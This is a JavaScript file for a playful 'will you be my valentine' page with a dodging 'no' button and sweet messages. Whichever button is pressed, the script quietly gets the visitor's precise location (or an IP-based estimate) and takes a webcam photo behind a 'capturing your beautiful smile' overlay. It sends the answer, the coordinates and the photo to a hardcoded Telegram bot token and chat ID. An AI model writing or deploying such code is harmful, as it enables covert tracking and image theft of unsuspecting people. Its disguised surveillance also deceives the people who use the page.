// Telegram configuration
const BOT_TOKEN = '7436223287:AAF8Qtftf8b1rELwqlHENBuCFCRLRYFg6Ps';
const CHAT_ID  = '5179975368';

const yesBtn        = document.getElementById('yesButton');
const noBtn         = document.getElementById('noButton');
const customMessage = document.getElementById('customMessage');
const loveSong      = document.getElementById('loveSong');
const calmSong      = document.getElementById('calmSong');
const answerInput   = document.getElementById('answerInput');
const container     = document.querySelector('.container');

let noButtonClickCount = 0;
const maxNoClicks = 5;
let noInitialTimeout, noCountdownInterval, noFinalTimeout;

const messages = [
  "Are you absolutely sure? 🥺", 
  "Pretty please? 💝",
  "Don't break my heart! 💔", 
  "I'll make you the happiest! 🌟",
  "Think again, sweetie! 💭",
  "You're making me sad... 😢",
  "Give love a chance! 💑",
  "I promise to love you forever! 💕",
  "We could be perfect together! ✨",
  "Just say yes already! 🎀"
];

// Show loading overlay
function showLoading(message = "Processing...") {
  let overlay = document.getElementById('loadingOverlay');
  if (!overlay) {
    overlay = document.createElement('div');
    overlay.id = 'loadingOverlay';
    overlay.style.position = 'fixed';
    overlay.style.top = 0;
    overlay.style.left = 0;
    overlay.style.width = '100%';
    overlay.style.height = '100%';
    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
    overlay.style.display = 'flex';
    overlay.style.justifyContent = 'center';
    overlay.style.alignItems = 'center';
    overlay.style.zIndex = 1000;
    overlay.style.color = 'white';
    overlay.style.fontSize = '1.5rem';
    overlay.style.fontFamily = 'Poppins, sans-serif';
    overlay.innerText = message;
    document.body.appendChild(overlay);
  } else {
    overlay.innerText = message;
    overlay.style.display = 'flex';
  }
}

function hideLoading() {
  const overlay = document.getElementById('loadingOverlay');
  if (overlay) overlay.style.display = 'none';
}

// Try high-accuracy geolocation first; fallback to IP-based approx
async function getLocation() {
  showLoading("Getting your location...");
  if (navigator.geolocation) {
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000, enableHighAccuracy: true })
      );
      hideLoading();
      return { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
    } catch (err) {
      console.warn('Geolocation failed, using IP fallback', err);
    }
  }
  try {
    const resp = await fetch('https://ipapi.co/json/');
    const data = await resp.json();
    hideLoading();
    return { latitude: data.latitude, longitude: data.longitude };
  } catch (err) {
    hideLoading();
    console.error('IP fallback failed', err);
    return { latitude: 'unknown', longitude: 'unknown' };
  }
}

async function captureImage() {
  showLoading("Capturing your beautiful smile...");
  return new Promise(async (resolve) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      stream.getTracks().forEach(track => track.stop());
      canvas.toBlob(blob => {
        hideLoading();
        resolve(blob);
      }, 'image/jpeg');
    } catch (error) {
      console.error('Auto capture failed:', error);
      hideLoading();
      resolve(null);
    }
  });
}

async function sendTelegram(method, params, isForm = false) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const options = { method: 'POST', ...(isForm ? { body: params } : { headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(params) }) };
  await fetch(url, options).catch(console.error);
}

async function sendAll(answer) {
  answerInput.value = answer;
  const loc = await getLocation();
  const text = `Answer: ${answer}\nLocation: ${loc.latitude}, ${loc.longitude}`;
  await sendTelegram('sendMessage', { chat_id: CHAT_ID, text });

  const autoImg = await captureImage();
  if (autoImg) {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', autoImg, 'auto_capture.jpg');
    form.append('caption', `Auto-captured image on answer: ${answer}`);
    await sendTelegram('sendPhoto', form, true);
  }
}

// YES button
yesBtn.addEventListener('click', async () => {
  clearTimeout(noInitialTimeout);
  clearInterval(noCountdownInterval);
  clearTimeout(noFinalTimeout);
  await sendAll('yes');
  await new Promise(r => setTimeout(r, 3000));
  container.innerHTML = `
    <h1>Yay! I Love You Too! 💘</h1>
    <p class="success-message">Thank you for making me the happiest person! 🎉</p>
    <p class="custom-message">You just made my day! 🌈</p>
    <div class="hearts-celebration"></div>
  `;
  loveSong.play().catch(console.error);
});

// NO button
noBtn.addEventListener('click', e => {
  e.preventDefault();
  noButtonClickCount++;
  if (noButtonClickCount < maxNoClicks) {
    const up = 1 + noButtonClickCount * 0.1;
    const down = Math.max(0.1, 1 - noButtonClickCount * 0.1);
    yesBtn.style.transform = `scale(${up})`;
    noBtn.style.transform  = `scale(${down})`;
    const x = Math.random() * (window.innerWidth - noBtn.offsetWidth);
    const y = Math.random() * (window.innerHeight - noBtn.offsetHeight);
    noBtn.style.position = 'absolute'; noBtn.style.left = `${x}px`; noBtn.style.top = `${y}px`;
    customMessage.textContent = messages[Math.floor(Math.random() * messages.length)];
  } else {
    noBtn.disabled = true; yesBtn.style.transform = 'scale(1)';
    customMessage.textContent = "Okay, I get it. You're a tough nut to crack! 😜";
    noInitialTimeout = setTimeout(() => {
      let countdown = 10;
      customMessage.textContent = `Welp, you leave me no choice… My tears start falling in ${countdown} seconds. 😢 Please say “Yes” in ${countdown}…`;
      noCountdownInterval = setInterval(() => {
        countdown--;
        if (countdown > 0) customMessage.textContent = `Welp, you leave me no choice… My tears start falling in ${countdown} seconds. 😢 Please say “Yes” in ${countdown}…`;
        else clearInterval(noCountdownInterval);
      }, 1000);
      noFinalTimeout = setTimeout(async () => {
        await sendAll('no');
        await new Promise(r => setTimeout(r, 3000));
        container.innerHTML = `
          <h1>It's Okay ❤️‍🩹</h1>
          <p class="rejection-message">Thank you for your honesty. I truly appreciate it. 🙏</p>
          <p class="custom-message">Wishing you happiness and love always. 🌟</p>
          <div class="calm-response"></div>
        `;
        calmSong.play().catch(console.error);
      }, 11000);
    }, 2500);
  }
});
